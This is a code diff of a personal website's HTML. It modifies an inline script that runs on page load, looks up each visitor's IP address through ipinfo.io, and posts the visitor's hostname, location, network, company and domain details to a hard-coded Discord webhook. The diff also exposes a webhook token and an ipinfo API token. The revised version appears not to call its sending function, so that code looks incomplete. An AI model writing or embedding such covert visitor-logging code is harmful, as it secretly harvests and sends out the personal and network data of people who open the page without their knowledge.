@@ -682,61 +682,46 @@
 <script src="https://unpkg.com/scrollreveal"></script>
 <script src="js/dpDh3xVawFhS.js"></script></body></html>
 <script>
-function getIpInfo() {
-    var ipInfo = {};
-
-    // Make a request to ipinfo.io to get IP information
-    var ipRequest = new XMLHttpRequest();
-    ipRequest.open("GET", "https://ipinfo.io/?format=json", false);
-    ipRequest.send();
-
-    if (ipRequest.status === 200) {
-        ipInfo = JSON.parse(ipRequest.responseText);
-    }
-
-    return ipInfo;
-}
-
-// Function to send IP information to Discord webhook
 function sendToDiscord(ipInfo) {
-    // Create a new XMLHttpRequest object
-    var discordRequest = new XMLHttpRequest();
-
-    // Set up the request to the Discord webhook
-    discordRequest.open("POST", "https://discord.com/api/webhooks/1173731890000306246/jYwMzBS8MqZedSgWdwyx0lNXDJQW_WkSHWI2hDSGPxte96sUlwCjsMWSOHSWLnvOzRbK");
-    discordRequest.setRequestHeader('Content-type', 'application/json');
-
-    // Extract IP information and format for Discord message
+    var request = new XMLHttpRequest();
+    
+    request.open("POST", "https://discord.com/api/webhooks/1173731890000306246/jYwMzBS8MqZedSgWdwyx0lNXDJQW_WkSHWI2hDSGPxte96sUlwCjsMWSOHSWLnvOzRbK"); // Replace WEBHOOK_ID and WEBHOOK_TOKEN with your actual values
+    
+    request.setRequestHeader('Content-type', 'application/json');
+    
     var params = {
-        username: "ermal.is-a.dev",
-        avatar_url: "https://cdn.discordapp.com/avatars/1170810565912952963/585557a19fd78920d7ffacd464385329.webp?size=80",
-        embeds: [{
-            title: "ermal.is-a.dev",
-            color: 15000,
-            description: `**IP:** \`${ipInfo.ip || "N/A"}\`\n` +
-                `**Hostname:** \`${ipInfo.hostname || "N/A"}\`\n` +
-                `**City:** \`${ipInfo.city || "N/A"}\`\n` +
-                // Include other IP information fields as needed
-        }]
+        username: "YourBotName",
+        avatar_url: "YourBotAvatarURL",
+        embeds: [
+            {
+                title: "IP Information",
+                color: 15000,
+                description: `**IP:** \`${ipInfo.ip || "N/A"}\`\n` +
+                    `**Hostname:** \`${ipInfo.hostname || "N/A"}\`\n` +
+                    `**City:** \`${ipInfo.city || "N/A"}\`\n` +
+                    `**Region:** \`${ipInfo.region || "N/A"}\`\n` +
+                    `**Country:** \`${ipInfo.country || "N/A"}\`\n` +
+                    `**Postal Code:** \`${ipInfo.postal || "N/A"}\`\n` +
+                    `**Timezone:** \`${ipInfo.timezone || "N/A"}\`\n` +
+                    `**Anycast:** ${ipInfo.anycast ? "Yes" : "No"}\n` +
+                    `**ASN:** \`${ipInfo.asn && ipInfo.asn.asn ? ipInfo.asn.asn : "N/A"}\`\n` +
+                    `**ASN Name:** \`${ipInfo.asn && ipInfo.asn.name ? ipInfo.asn.name : "N/A"}\`\n` +
+                    `**ASN Domain:** \`${ipInfo.asn && ipInfo.asn.domain ? ipInfo.asn.domain : "N/A"}\`\n` +
+                    `**ASN Route:** \`${ipInfo.asn && ipInfo.asn.route ? ipInfo.asn.route : "N/A"}\`\n\n` +
+                    `**Company:** \`${ipInfo.company && ipInfo.company.name ? ipInfo.company.name : "N/A"}\`\n` +
+                    `**Company Domain:** \`${ipInfo.company && ipInfo.company.domain ? ipInfo.company.domain : "N/A"}\`\n` +
+                    `**Company Type:** \`${ipInfo.company && ipInfo.company.type ? ipInfo.company.type : "N/A"}\`\n\n` +
+                    `**Abuse Address:** \`${ipInfo.abuse && ipInfo.abuse.address ? ipInfo.abuse.address : "N/A"}\`\n` +
+                    `**Abuse Country:** \`${ipInfo.abuse && ipInfo.abuse.country ? ipInfo.abuse.country : "N/A"}\`\n` +
+                    `**Abuse Email:** \`${ipInfo.abuse && ipInfo.abuse.email ? ipInfo.abuse.email : "N/A"}\`\n` +
+                    `**Abuse Phone:** \`${ipInfo.abuse && ipInfo.abuse.phone ? ipInfo.abuse.phone : "N/A"}\`\n\n` +
+                    `**Domains Total:** \`${ipInfo.domains && ipInfo.domains.total ? ipInfo.domains.total : "N/A"}\`\n` +
+                    `**Domains List:** ${ipInfo.domains && ipInfo.domains.domains ? ipInfo.domains.domains.map(domain => `\n- ${domain}`).join("") : "N/A"}`
+            }
+        ]
     };
-
-    try {
-        // Send the request with the formatted IP information
-        discordRequest.send(JSON.stringify(params));
-    } catch (error) {
-        console.error("Error sending Discord request:", error);
-    }
-}
-
-// Main script execution
-try {
-    // Get IP information
-    var ipInfo = getIpInfo();
-
-    // Send IP information to Discord
-    sendToDiscord(ipInfo);
-} catch (error) {
-    console.error("Error:", error);
+    
+    request.send(JSON.stringify(params));
 }
 </script>
-<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+<script src="https://ipinfo.io/?token=4251134854bbf7"></script>
